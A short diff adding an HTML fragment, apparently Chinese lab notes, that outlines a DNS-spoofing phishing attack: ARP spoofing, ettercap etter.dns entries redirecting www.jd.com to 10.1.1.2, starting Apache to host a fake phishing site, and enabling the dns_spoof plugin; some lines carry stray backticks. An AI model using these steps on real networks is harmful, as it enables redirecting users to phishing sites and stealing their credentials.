@@ -1,0 +1,20 @@
+I"�<p>1.ARP欺骗攻击<br /></p>
+
+<p>2.伪装DNS服务器(正向解析)<br /></p>
+<ul>
+  <li>vim /etc/ettercap/etter.dns`</li>
+  <li>www.jd.com A 10.1.1.2`</li>
+  <li>A 10.1.1.2`</li>
+  <li>www.jd.com PTR 10.1.1.2`</li>
+  <li>PTR 10.1.1.2`</li>
+</ul>
+
+<p>3.开Apache发布一个虚假的钓鱼网站<br />
+systemctl start apache2<br />
+netstat -antpl<br />
+cd /var/www/html/<br /></p>
+
+<p>4.ettercap<br />
+add to target<br />
+Plugins=&gt;dns_spoof<br /></p>
+:ET
